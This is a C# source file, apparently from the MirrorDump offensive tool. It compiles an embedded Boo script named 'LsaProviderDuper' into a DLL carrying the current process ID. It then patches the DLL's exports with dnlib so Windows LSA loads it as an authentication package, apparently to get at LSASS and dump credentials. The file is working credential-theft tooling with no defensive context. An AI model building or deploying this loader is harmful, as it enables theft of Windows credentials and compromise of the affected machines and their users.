using Boo.Lang.Compiler;
using Boo.Lang.Compiler.IO;
using Boo.Lang.Compiler.Pipelines;
using dnlib.DotNet;
using dnlib.DotNet.Writer;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;

namespace MirrorDump.Lsa {
    internal class LsaAssembly {

        static Random random = new Random();

        internal static void GenerateLsaPlugin(string dllName) {

            var referenceAssemblies = new List<Assembly> {
                Assembly.GetCallingAssembly(),
                typeof(System.Runtime.InteropServices.CallingConvention).Assembly,
            };

            string script = string.Format(GetResourceFileAsString("MirrorDump.Lsa.LsaProviderDuper.boo"), Process.GetCurrentProcess().Id);
            AssemblyBuilder assembly = (AssemblyBuilder)CompileBooAssembly(script, referenceAssemblies, dllName, true);
            assembly.Save(dllName);
            ExportLsaEntryPoint(dllName);
        }

        static string RandomString(int length) {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        static Assembly CompileBooAssembly(string script, List<Assembly> references, string assemblyPath, bool memoryOnly) {

            //We need to supply custom CompilerParameters to turn of adding default references.
            //There is a bug in EmitAssembly that forces a permission check of destination assembly folder
            //not to be performed and always resort to the AppDomain folder as the output location instead  
            BooCompiler compiler = new BooCompiler(new CompilerParameters(false));
            compiler.Parameters.Input.Add(new StringInput(RandomString(10), script));
            compiler.Parameters.OutputType = CompilerOutputType.Library;
            compiler.Parameters.Debug = false;
            compiler.Parameters.Checked = false;
            compiler.Parameters.GenerateInMemory = memoryOnly;
            compiler.Parameters.OutputAssembly = assemblyPath;
            compiler.Parameters.Pipeline = memoryOnly ? new CompileToMemory() : new CompileToFile();
            compiler.Parameters.References.Add(compiler.Parameters.LoadAssembly("System", true));
            compiler.Parameters.References.Add(compiler.Parameters.LoadAssembly("System.Runtime", true));

            foreach (Assembly reference in references) {
                compiler.Parameters.References.Add(reference);
            }

            CompilerContext context = compiler.Run();

            if (context.GeneratedAssembly != null) {
                return context.GeneratedAssembly;
            } else {
                string compilerErrors = "";
                foreach (CompilerError error in context.Errors)
                    compilerErrors += error;

                throw new ArgumentException(compilerErrors, "script");
            }
        }

        static string GetResourceFileAsString(string resourcePath) {
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourcePath))
            using (StreamReader reader = new StreamReader(stream)) {
                return reader.ReadToEnd();
            }
        }

        static void ExportLsaEntryPoint(string assemblyPath) {

            byte[] data = File.ReadAllBytes(assemblyPath);
            ModuleDefMD module = ModuleDefMD.Load(data);

            //Little trick here that uses dnlib to search for all functions within our generated
            //assembly that has the DllExport attribute.  We then mark that function as a native export
            //and remove the attribute so that we don't have a dependency on this assembly
            foreach (var type in module.GetTypes()) {
                foreach (var method in type.Methods) {
                    var toRemove = new List<CustomAttribute>();
                    foreach (var attrib in method.CustomAttributes) {
                        if (attrib.TypeFullName == typeof(DllExportAttribute).FullName) {
                            method.ExportInfo = new MethodExportInfo();
                            var retType = method.MethodSig.RetType;
                            method.MethodSig.RetType = new CModOptSig(module.CorLibTypes.GetTypeRef("System.Runtime.CompilerServices", "CallConvStdCall"), retType);
                            toRemove.Add(attrib);
                        }
                    }
                    toRemove.ForEach(remove => method.CustomAttributes.Remove(remove));
                }
            }

            var moduleOptions = new ModuleWriterOptions(module);
            moduleOptions.PEHeadersOptions.Machine = IntPtr.Size == 8 ? dnlib.PE.Machine.AMD64 : dnlib.PE.Machine.I386;
            moduleOptions.Cor20HeaderOptions.Flags &= ~(dnlib.DotNet.MD.ComImageFlags.ILOnly);
            if (IntPtr.Size == 4) {
                moduleOptions.Cor20HeaderOptions.Flags |= dnlib.DotNet.MD.ComImageFlags.Bit32Required;
                moduleOptions.Cor20HeaderOptions.Flags &= ~(dnlib.DotNet.MD.ComImageFlags.Bit32Preferred);
            }

            module.Write(assemblyPath, moduleOptions);
        }        
    }
}
